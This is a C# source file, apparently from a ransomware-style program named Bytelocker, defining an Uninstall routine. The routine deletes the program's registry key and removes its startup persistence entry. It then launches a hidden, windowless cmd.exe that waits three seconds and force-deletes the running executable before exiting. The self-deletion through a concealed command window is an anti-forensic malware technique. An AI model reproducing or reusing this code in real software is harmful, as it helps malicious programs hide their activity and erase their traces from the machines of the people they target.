using System;
using System.Diagnostics;
using Bytelocker.Settings;

namespace Bytelocker.Installer
{
    internal class Uninstall
    {
        private readonly RegistryManager rm;

        public Uninstall()
        {
            rm = new RegistryManager();
            DeleteRegChanges();
            Delete();
            RemoveFromStartup();

            Environment.Exit(0);
        }

        private void DeleteRegChanges()
        {
            var rm = new RegistryManager();
            rm.DeleteMainKey();
        }

        private void Delete()
        {
            var psi = new ProcessStartInfo();
            var path = rm.getStartupPath(Persistence.REGISTRY_STARTUP_VALUE_NAME);

            if (path == "none")
                psi.Arguments = "/C timeout 3 & del /f /q \"" + Process.GetCurrentProcess().MainModule.FileName + "\"";
            else
                psi.Arguments = "/C timeout 3 & del /f /q \"" + path + "\"";

            psi.WindowStyle = ProcessWindowStyle.Hidden;
            psi.CreateNoWindow = true;
            psi.FileName = "cmd.exe";

            Process.Start(psi);
        }

        private void RemoveFromStartup()
        {
            rm.RemoveFromStartup(Persistence.REGISTRY_STARTUP_VALUE_NAME);
        }
    }
}